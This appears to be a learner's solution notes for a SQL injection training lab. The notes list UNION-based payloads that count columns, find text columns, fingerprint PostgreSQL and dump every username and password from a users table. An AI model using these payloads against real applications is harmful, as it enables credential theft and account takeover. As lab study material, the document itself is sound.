This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

Hint: You can find some useful payloads on our SQL injection cheat sheet. 

End Goal: retrieve all usernames and passwords and login as the administrator user.

Analysis:
--------

1) Find the number of columns that the vulnerable is using:
' order by 1-- => not displayed on the page
' order by 2-- => displayed on the page
' order by 3-- => internal server error

3 - 1 = 2

2) Find which columns contain text
' UNION select 'a', NULL--
' UNION select NULL, 'a'-- =>**

3) Output data from other tables
' UNION select NULL, username from users--
' UNION select NULL, password from users--

' UNION select NULL, version()--
- PostgreSQL

' UNION select NULL, username || ':' || password from users--
